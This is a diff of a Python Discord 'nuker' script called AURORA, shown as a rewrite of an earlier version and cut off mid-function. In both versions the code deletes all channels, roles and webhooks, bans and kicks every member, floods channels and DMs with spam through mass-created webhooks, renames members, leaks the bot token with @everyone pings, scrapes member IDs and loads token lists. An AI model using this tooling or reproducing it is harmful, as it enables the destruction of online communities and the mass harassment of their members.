@@ -1,664 +1,1171 @@
 import discord
 from discord.ext import commands
 import asyncio
-import sys
+import random
 import os
-from colorama import Fore, Style
+import aiohttp
+from asyncio import sleep
+import subprocess
+import base64
+import threading
+import string
+import time
+from datetime import datetime
+from PIL import Image, ImageDraw, ImageFont
+import pyautogui
+import math
+import sys
 
-TOKEN = "YOUR_BOT_TOKEN" # You can leave this alone cause itll ask you anyways, its just that I fucked up a lil lmfao
+# Check and install required modules
+required_modules = ["discord", "Pillow", "pyautogui", "aiohttp"]
+for module in required_modules:
+    try:
+        __import__(module)
+    except ImportError:
+        print(f"Module '{module}' not found. Installing...")
+        subprocess.check_call(["pip", "install", module])
 
-client = commands.Bot(command_prefix=".", intents=discord.Intents.all())
+intents = discord.Intents.all()
+client = commands.Bot(command_prefix='!', intents=intents)
 
-# --- ANSI Colors ---
-RED = Fore.RED
-GREEN = Fore.LIGHTGREEN_EX
-YELLOW = Fore.LIGHTYELLOW_EX
-BLUE = Fore.LIGHTBLUE_EX
-PURPLE = Fore.LIGHTMAGENTA_EX
-CYAN = Fore.CYAN
-WHITE = Fore.WHITE
-BLACK = Fore.BLACK
-ENDC = Style.RESET_ALL
-BOLD = Style.BRIGHT
+token = input("Enter your Discord Bot Token: ")
+webhook_url = None
+multiple_tokens = []
+current_guild = None
+thread_count = 5
+safe_mode = False
+rate_limit_count = 0
 
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-# --- Global Variables ---
-cancel_flag = False
+def rgb_to_ansi(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
 
-def clear_console():
-    os.system('cls' if os.name in ('nt', 'dos') else 'clear')
-
-def typing_print(text):
-    for character in text:
-        sys.stdout.write(character)
-        sys.stdout.flush()
-        asyncio.sleep(0.03)
-    print()
-
-# --- ASCII Banner ---
-BANNER = f"""{PURPLE}
- ▄▀▀█▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄ 
-▐ ▄▀ ▀▄ █   █    █ █   █   █ █      █ █   █   █ ▐ ▄▀ ▀▄
-  █▄▄▄█ ▐  █    █  ▐  █▀▀█▀  █      █ ▐  █▀▀█▀    █▄▄▄█
- ▄▀   █   █    █    ▄▀    █  ▀▄    ▄▀  ▄▀    █   ▄▀   █
-█   ▄▀     ▀▄▄▄▄▀  █     █     ▀▀▀▀   █     █   █   ▄▀ 
-▐   ▐              ▐     ▐            ▐     ▐   ▐   ▐  {ENDC}
-"""
-
-
-def get_user_input(prompt, min_value=1, max_value=30):
-    while True:
-        try:
-            input_value = input(prompt)
-            if input_value.isdigit() and min_value <= int(input_value) <= max_value:
-                return int(input_value)
-            else:
-                print(f"{RED}Invalid choice. Please enter a number between {min_value} and {max_value}.{ENDC}")
-        except (KeyboardInterrupt, EOFError):
-            print(f"\n{RED}Action cancelled.{ENDC}")
-            return None
-
-
-async def handle_choice(client, guild):
-    choice = await display_menu(client)
-    if choice == 1:
-        await delete_channels(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 2:
-        await create_channels(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 3:
-        await delete_all_voice_channels(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 4:
-        await create_voice_channels(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 5:
-        await delete_roles(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 6:
-        await create_roles(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 7:
-        await strip_user_roles(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 8:
-        await show_log(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 9:
-        await kick_all_users(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 10:
-        await ban_all_users(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 11:
-        await change_server_nickname(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 12:
-        await spam_messages(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 13:
-        await nickname_all(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 14:
-        await leak_token(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 15:
-        await change_vanity(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 16:
-        await full_nuke(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 17:
-        await delete_webhooks(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 18:
-        await spam_webhooks(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 19:
-        await self_advertise(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 20:
-        await open_github(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 21:
-        await open_youtube(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 22:
-        await show_discord(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 23:
-        await dm_spam(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 24:
-        await member_id_scraper(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 25:
-        await server_lookup(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 26:
-        await nuke_account(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 27:
-        await check_token(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 28:
-        await patch_notes(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 29:
-        await set_threads(client, guild)
-        await asyncio.sleep(2.5)
-        await handle_choice(client, guild)
-    elif choice == 30:
-        print(f"{PURPLE}Exiting...{ENDC}")
-        await client.close()
+async def handle_rate_limit(e):
+    global rate_limit_count
+    print(f"\033[38;2;255;0;0mRate limited: {e}\033[0m")
+    rate_limit_count += 1
+    if rate_limit_count >= 3:
+        print("\033[38;2;255;0;0mRate limited too many times. Returning to main menu.\033[0m")
+        await main_menu()
+        rate_limit_count = 0
     else:
-        print(f"{RED}Invalid choice. Please try again.{ENDC}")
-        await handle_choice(client, guild)
+        await asyncio.sleep(2)
 
-
-async def delete_channels(client, guild):
+async def delete_channels():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
     try:
-        for channel in guild.channels:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await channel.delete()
-                print(f"{GREEN}Deleted channel: {channel.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to delete channel: {channel.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished deleting channels.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error deleting channels: {e}{ENDC}")
+        await current_guild.delete_channels(reason="Deleted by AURORA")
+        print("\033[38;2;0;255;0mFinished deleting channels.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
 
-
-async def create_channels(client, guild):
+async def create_vcs():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    name = input("Enter the name for the VCs: ")
+    quantity = int(input("Enter the number of VCs to create: "))
     try:
-        channel_name = input(f"{PURPLE}Enter the name for the channels: {ENDC}")
-        if channel_name is None:
-            return
-        num_channels = get_user_input(f"{PURPLE}Enter the number of channels to create (1-50): {ENDC}", 1, 50)
-        if num_channels is None:
-            return
-        for _ in range(num_channels):
-            try:
-                await guild.create_text_channel(channel_name)
-                print(f"{GREEN}Created channel: {channel_name}{ENDC}")
-            except discord.HTTPException as e:
-                if e.status == 403:
-                    print(f"{RED}Permission Denied: Cannot create more channels.{ENDC}")
-                    break
-                else:
-                    print(f"{RED}Failed to create channel: {e}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to create channel: {e}{ENDC}")
+        await current_guild.create_voice_channels(name=name, count=quantity, reason="Created by AURORA")
+        print(f"\033[38;2;0;255;0mFinished creating {quantity} VCs.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
 
-    except Exception as e:
-        print(f"{RED}Error creating channels: {e}{ENDC}")
-
-
-async def delete_all_voice_channels(client, guild):
+async def create_channels():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    name = input("Enter the name for the channels: ")
+    quantity = int(input("Enter the number of channels to create: "))
     try:
-        for vc in guild.voice_channels:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await vc.delete()
-                print(f"{GREEN}Deleted VC: {vc.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to delete VC: {vc.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished deleting voice channels.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error deleting voice channels: {e}{ENDC}")
+        await current_guild.create_text_channels(name=name, count=quantity, reason="Created by AURORA")
+        print(f"\033[38;2;0;255;0mFinished creating {quantity} channels.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
 
+async def spam_messages():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    message = input("Enter the message to spam: ")
+    amount = int(input("Enter the number of messages per channel: "))
+    webhook_count = int(input("Enter the number of webhooks to create per channel: "))
 
-async def create_voice_channels(client, guild):
-    try:
-        vc_name = input(f"{PURPLE}Enter the name for the voice channels: {ENDC}")
-        if vc_name is None:
-            return
-        num_vcs = get_user_input(f"{PURPLE}Enter the number of VCs to create (1-25): {ENDC}", 1, 25)
-        if num_vcs is None:
-            return
-        for _ in range(num_vcs):
-            try:
-                await guild.create_voice_channel(vc_name)
-                print(f"{GREEN}Created voice channel: {vc_name}{ENDC}")
-            except discord.HTTPException as e:
-                if e.status == 403:
-                    print(f"{RED}Permission Denied: Cannot create more voice channels.{ENDC}")
-                    break
-                else:
-                    print(f"{RED}Failed to create voice channel: {e}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to create voice channel: {e}{ENDC}")
-
-    except Exception as e:
-        print(f"{RED}Error creating voice channels: {e}{ENDC}")
-
-
-async def delete_roles(client, guild):
-    try:
-        for role in guild.roles[1:]:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await role.delete()
-                print(f"{GREEN}Deleted role: {role.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to delete role: {role.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished deleting roles.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error deleting roles: {e}{ENDC}")
-
-
-async def create_roles(client, guild):
-    try:
-        role_name = input(f"{PURPLE}Enter the name for the roles: {ENDC}")
-        if role_name is None:
-            return
-        admin_choice = input(f"{PURPLE}Should roles have admin permissions (y/n): {ENDC}")
-        num_roles = get_user_input(f"{PURPLE}Enter the number of roles to create (1-10): {ENDC}", 1, 10)
-        if num_roles is None:
-            return
-        for _ in range(num_roles):
-            try:
-                role = await guild.create_role(name=role_name)
-                print(f"{GREEN}Created role: {role.name}{ENDC}")
-                if admin_choice.lower() == 'y':
-                    perms = discord.Permissions(administrator=True)
-                    await role.edit(permissions=perms)
-                    print(f"{GREEN}Admin permissions added to {role.name}{ENDC}")
-            except discord.HTTPException as e:
-                if e.status == 403:
-
-                    print(f"{RED}Permission Denied: Cannot create more roles.{ENDC}")
-                    break
-                else:
-                    print(f"{RED}Failed to create role: {e}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to create role: {e}{ENDC}")
-
-    except Exception as e:
-        print(f"{RED}Error creating roles: {e}{ENDC}")
-
-
-async def strip_user_roles(client, guild):
-    try:
-        for member in guild.members:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                for role in member.roles[1:]: 
-                    await member.remove_roles(role)
-                    print(f"{GREEN}Stripped role {role.name} from {member.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to strip roles from {member.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished stripping roles.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error stripping roles: {e}{ENDC}")
-
-
-async def show_log(client, guild):
-    print(f"{YELLOW}Log functionality is in development, planned release date to be next update.{ENDC}")
-
-
-async def kick_all_users(client, guild):
-    try:
-        for member in guild.members:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await member.kick()
-                print(f"{GREEN}Kicked user: {member.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to kick user: {member.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished kicking users.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error kicking users: {e}{ENDC}")
-
-
-async def ban_all_users(client, guild):
-    try:
-        for member in guild.members:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await member.ban()
-                print(f"{GREEN}Banned user: {member.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to ban user: {member.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished banning users.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error banning users: {e}{ENDC}")
-
-
-async def change_server_nickname(client, guild):
-    try:
-        new_name = input(f"{PURPLE}Enter the new server name: {ENDC}")
-        if new_name is None:
-            return
-        await guild.edit(name=new_name)
-        print(f"{GREEN}Server name changed to: {new_name}{ENDC}")
-    except Exception as e:
-        print(f"{RED}Failed to change server name - {e}{ENDC}")
-
-
-async def spam_messages(client, guild):
-    try:
-        message = input(f"{PURPLE}Enter the message to spam: {ENDC}")
-        if message is None:
-            return
-        for channel in guild.text_channels:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await channel.send(message)
-                print(f"{GREEN}Sent message to {channel.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to send message to {channel.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished spamming messages.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error spamming messages: {e}{ENDC}")
-
-
-async def nickname_all(client, guild):
-    try:
-        new_nickname = input(f"{PURPLE}Enter the new nickname: {ENDC}")
-        if new_nickname is None:
-            return
-        for member in guild.members:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await member.edit(nick=new_nickname)
-                print(f"{GREEN}Changed {member.name}'s nickname to {new_nickname}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to change {member.name}'s nickname - {e}{ENDC}")
-        print(f"{GREEN}Finished changing nicknames.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error changing nicknames: {e}{ENDC}")
-
-
-async def leak_token(client, guild):
-    try: 
-        token_message = f"{client.http.token}"
-        # Spam in chat
-        for channel in guild.text_channels:
-            for _ in range(4):
-                await channel.send(token_message )
-                await asyncio.sleep(0.5)
-
-        # Spam in DMs
-        for member in guild.members:
-            for _ in range(4):
-                try:
-                    await member.send(token_message)
-                except:
-                    pass  # Ignore errors if DMing fails
-                await asyncio.sleep(0.5)
-
-        print(f"{GREEN}Spilled the beans: Token flooded everywhere!{ENDC}")
-
-    except Exception as e:
-        print(f"{RED}Failed to spill the beans: {e}{ENDC}")
-
-
-
-async def change_vanity(client, guild):
-    try:
-        new_vanity = input(f"{PURPLE}Enter the new vanity URL: {ENDC}")
-        if new_vanity is None:
-            return
+    async def spam_channel(channel, message, amount, webhook_count):
         try:
-            await guild.edit(vanity_url_code=new_vanity)
-            print(f"{GREEN}Vanity URL changed to {new_vanity}{ENDC}")
-        except Exception as e:
-            print(f"{RED}Failed to change vanity URL - {e}{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error changing vanity URL: {e}{ENDC}")
+            webhooks = await asyncio.gather(*[channel.create_webhook(name=f"AURORA-{i}") for i in range(webhook_count)])
+        except discord.Forbidden:
+            print(f"\033[38;2;255;0;0mMissing permissions to create webhooks in channel: {channel.name}\033[0m")
+            return
+        except discord.HTTPException as e:
+            print(f"\033[38;2;255;0;0mFailed to create webhook in channel: {channel.name}, Error: {e}\033[0m")
+            return
+        send_tasks = [webhook.send(message) for _ in range(amount) for webhook in webhooks]
+        try:
+            await asyncio.gather(*send_tasks)
+        except discord.HTTPException as e:
+            await handle_rate_limit(e)
+            return
+        await asyncio.gather(*[webhook.delete() for webhook in webhooks])
 
-
-async def full_nuke(client, guild):
     try:
-        await delete_channels(client, guild)
-        await delete_all_voice_channels(client, guild)
-        await delete_roles(client, guild)
-        await kick_all_users(client, guild)
-        await ban_all_users(client, guild)
-        print(f"{GREEN}Finished nuking server.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error nuking server: {e}{ENDC}")
+        await asyncio.gather(*(spam_channel(channel, message, amount, webhook_count) for channel in current_guild.text_channels))
+        print(f"\033[38;2;0;255;0mFinished spamming messages in {len(current_guild.text_channels)} channels.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
 
-
-async def delete_webhooks(client, guild):
+async def advertise():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    my_github_url = "https://github.com/ShroomStumper"
+    message = f"@everyone @here AURORA ON TOP COME GET IT NOW {my_github_url}\n{my_github_url}\n{my_github_url}"
     try:
-        for webhook in await guild.webhooks():
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
+        channel_tasks = [channel.edit(name="AURORA") for channel in current_guild.channels]
+        member_tasks = [member.edit(nick="AURORA") for member in current_guild.members if member != client.user]
+        send_tasks = [channel.send(message) for channel in current_guild.text_channels]
+        await asyncio.gather(*channel_tasks)
+        await asyncio.gather(*member_tasks)
+        await asyncio.gather(*send_tasks)
+        await current_guild.edit(name="AURORA")
+        print("\033[38;2;0;255;0mSuccessfully advertised AURORA.\033[0m")
+        rate_limit_count = 0
+    except discord.Forbidden:
+        print("\033[38;2;255;0;0mMissing permissions to rename the guild.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def dm_all_users():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    message = input("Enter the message to DM all users: ")
+    amount = int(input("Enter the number of times to send the message: "))
+
+    async def dm_user(member, message, amount):
+        if member != client.user:
             try:
-                await webhook.delete()
-                print(f"{GREEN}Webhook {webhook.id} successfully deleted.{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to delete webhook {webhook.id}: {e}{ENDC}")
-        print(f"{GREEN}Finished deleting webhooks.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error deleting webhooks: {e}{ENDC}")
-
-
-async def spam_webhooks(client, guild):
-    try:
-        webhook_url = input(f"{PURPLE}Enter the webhook url: {ENDC}")
-        if webhook_url is None:
-            return
-        message = input(f"{PURPLE}Enter the message you want to spam: {ENDC}")
-        if message is None:
-            return
-
-        webhook = discord.Webhook.from_url(webhook_url, session=client.http.session)
-        for _ in range(100):
-            await webhook.send(message)
-            print(f"{GREEN}Webhook spammed: {message}{ENDC}")
-            await asyncio.sleep(0.5) 
-
-        print(f"{GREEN}Finished spamming webhooks.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Failed to spam webhook: {e}{ENDC}")
-
-
-async def self_advertise(client, guild):
-    try:
-        advertisement = input(f"{PURPLE}Enter the advertisement: {ENDC}")
-        if advertisement is None:
-            return
-        for channel in guild.text_channels:
-            if cancel_flag:
-                print(f"{RED}Action cancelled.{ENDC}")
-                break
-            try:
-                await channel.send(f'{advertisement}')
-                print(f"{GREEN}Sent advertisement to {channel.name}{ENDC}")
-            except Exception as e:
-                print(f"{RED}Failed to send advertisement to {channel.name} - {e}{ENDC}")
-        print(f"{GREEN}Finished sending advertisements.{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error sending advertisements: {e}{ENDC}")
-
-
-async def open_github(client, guild):
-    os.system("start https://github.com/ShroomStumper")
-
-
-async def open_youtube(client, guild):
-    os.system("start https://www.youtube.com/@FentAddictAxe")
-
-
-async def show_discord(client, guild):
-    print(f"{PURPLE}My Discord: 5td1{ENDC}")
-
-
-async def dm_spam(client, guild):
-    try:
-        message = input(f"{PURPLE}Enter the message to spam: {ENDC}")
-        if message is None:
-            return
-        for member in guild.members:
-            if member != client.user:
-                try:
+                for _ in range(amount):
                     await member.send(message)
-                    print(f"{GREEN}Sent DM to {member.name}{ENDC}")
-                except Exception as e:
-                    print(f"{RED}Failed to send DM to {member.name}{ENDC}")
-        print(f"{GREEN}Finished sending DMs!{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error sending DMs: {e}{ENDC}")
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException as e:
+                await handle_rate_limit(e)
 
-
-async def member_id_scraper(client, guild):
     try:
-        print(f"{PURPLE}Scraping member IDs...{ENDC}")
-        with open('member_ids.txt', mode='w', encoding='utf-8') as f:
-            for member in guild.members:
-                if cancel_flag:
-                    print(f"{RED}Action cancelled.{ENDC}")
-                    break
-                f.write(f'{member.id}\n')
-                print(f"{GREEN}Scraped {member.name} ({member.id}) Id{ENDC}")
-        print(f"{GREEN}Scraped all member IDs and uploaded them to member_ids.txt{ENDC}")
-    except Exception as e:
-        print(f"{RED}Error scraping member IDs: {e}{ENDC}")
+        dm_tasks = [dm_user(member, message, amount) for member in current_guild.members]
+        await asyncio.gather(*dm_tasks)
+        print(f"\033[38;2;0;255;0mFinished DMing all users.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
 
+async def ban_all_users():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
 
-async def server_lookup(client, guild):
-    print(f"{YELLOW}Server lookup is in development, planned release date to be next update.{ENDC}")
-
-
-async def nuke_account(client, guild):
-    print(f"{YELLOW}Account nuker is in development, planned release date to be next update.{ENDC}")
-
-
-async def check_token(client, guild):
-    print(f"{YELLOW}Token checker is in development, planned release date to be next update.{ENDC}")
-
-
-async def patch_notes(client, guild):
-    print(f"{YELLOW}Patch notes is in development, planned release date to be next update.{ENDC}")
-
-
-async def set_threads(client, guild):
     try:
-        num_threads = input(f"{PURPLE}Enter the number of threads: {ENDC}")
-        if num_threads is None:
-            return
-        print(f"{GREEN}Using {num_threads} threads for specific operations.{ENDC}")
+        await current_guild.ban(reason="Banned by AURORA")
+        print("\033[38;2;0;255;0mFinished banning all users.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def unban_all_users():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        bans = await current_guild.bans()
+        await current_guild.unban(reason="Unbanned by AURORA")
+        print("\033[38;2;0;255;0mFinished unbanning users.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def kick_all_users():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        await current_guild.kick(reason="Kicked by AURORA")
+        print("\033[38;2;0;255;0mFinished kicking all users.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def server_rename():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    new_name = input("Enter the new name for the server: ")
+    try:
+        await current_guild.edit(name=new_name)
+        print(f"\033[38;2;0;255;0mRenamed server to: {new_name}\033[0m")
+        rate_limit_count = 0
+    except discord.Forbidden:
+        print("\033[38;2;255;0;0mMissing permissions to rename the server.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def change_server_banner():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    file_path = pyautogui.prompt("Enter the file path to the banner image:")
+    if not file_path:
+        print("No file path entered.")
+        return
+    try:
+        with open(file_path, "rb") as f:
+            banner = f.read()
+        await current_guild.edit(banner=banner)
+        print("\033[38;2;0;255;0mChanged server banner successfully.\033[0m")
+        rate_limit_count = 0
+    except discord.Forbidden:
+        print("\033[38;2;255;0;0mMissing permissions to change server banner.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+    except FileNotFoundError:
+        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")
+
+async def change_server_profile():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    file_path = pyautogui.prompt("Enter the file path to the profile image:")
+    if not file_path:
+        print("No file path entered.")
+        return
+
+    try:
+        with open(file_path, "rb") as f:
+            icon = f.read()
+        await current_guild.edit(icon=icon)
+        print("\033[38;2;0;255;0mChanged server profile picture successfully.\033[0m")
+        rate_limit_count = 0
+    except discord.Forbidden:
+        print("\033[38;2;255;0;0mMissing permissions to change server profile picture.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+    except FileNotFoundError:
+        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")
+
+async def delete_all_webhooks():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        webhooks = await current_guild.webhooks()
+        await asyncio.gather(*[webhook.delete() for webhook in webhooks])
+        print("\033[38;2;0;255;0mFinished deleting webhooks.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def create_webhooks():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    name = input("Enter the name for the webhooks: ")
+    quantity = int(input("Enter the number of webhooks to create: "))
+
+    try:
+        await current_guild.create_webhooks(name=name, count=quantity)
+        print(f"\033[38;2;0;255;0mFinished creating {quantity} webhooks.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def token_leaker():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    message = f"@everyone @here AURORA ON TOP {token}"
+    try:
+        await current_guild.send(message)
+        print("\033[38;2;0;255;0mFinished leaking token.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def leave_server():
+    global rate_limit_count, current_guild
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    try:
+        await current_guild.leave()
+        print("\033[38;2;0;255;0mLeft the server successfully.\033[0m")
+        current_guild = None
+        await select_guild()
+        await main_menu()
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def join_server():
+    global rate_limit_count, current_guild
+    invite_link = input("Enter the invite link to the server: ")
+    try:
+        invite = await client.fetch_invite(invite_link)
+        await invite.accept()
+        print(f"\033[38;2;0;255;0mJoined server: {invite.guild.name}\033[0m")
+        current_guild = invite.guild
+        rate_limit_count = 0
+    except discord.NotFound:
+        print("\033[38;2;255;0;0mInvalid invite link.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def my_youtube():
+    print("\033[38;2;0;255;0mMy Youtube Channel: https://www.youtube.com/@FentAddictAxe\033[0m")
+
+async def my_github():
+    print("\033[38;2;0;255;0mMy Github: https://github.com/ShroomStumper\033[0m")
+
+async def my_discord():
+    print("\033[38;2;0;255;0mMy Discord: 5td1#0001\033[0m")
+
+async def load_multiple_tokens():
+    global rate_limit_count, multiple_tokens
+    filepath = pyautogui.prompt("Enter the file path to the .txt file containing the tokens (one per line):")
+    if filepath is None:
+        print("\033[38;2;255;0;0mFile path not provided. Returning to the menu.\033[0m")
+        return
+
+    try:
+        with open(filepath, 'r') as f:
+            tokens = [token.strip() for token in f.readlines()]
+
+        async def verify_and_join(token):
+            try:
